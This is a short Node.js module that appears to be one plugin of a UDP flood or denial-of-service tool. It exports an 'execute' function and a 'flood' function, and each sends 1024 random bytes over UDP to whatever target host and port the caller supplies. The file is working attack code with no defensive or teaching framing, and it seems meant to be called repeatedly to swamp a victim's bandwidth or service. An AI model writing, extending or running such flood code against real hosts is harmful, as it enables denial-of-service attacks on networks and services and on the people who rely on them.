const dgram = require('dgram');
const crypto = require('crypto');

module.exports = {
    name: 'Random Payload UDP',
    description: 'Sends UDP packets with random payload',
    
    execute: async (target, port) => {
        const socket = dgram.createSocket('udp4');
        const message = crypto.randomBytes(1024);
        
        return new Promise((resolve, reject) => {
            socket.send(message, port, target, (err) => {
                if (err) reject(err);
                else resolve({ sent: true, size: message.length });
                socket.close();
            });
        });
    },
    
    flood: (target, port, callback) => {
        const socket = dgram.createSocket('udp4');
        const message = crypto.randomBytes(1024);
        
        socket.send(message, port, target, (err) => {
            socket.close();
            callback(!err);
        });
    }
};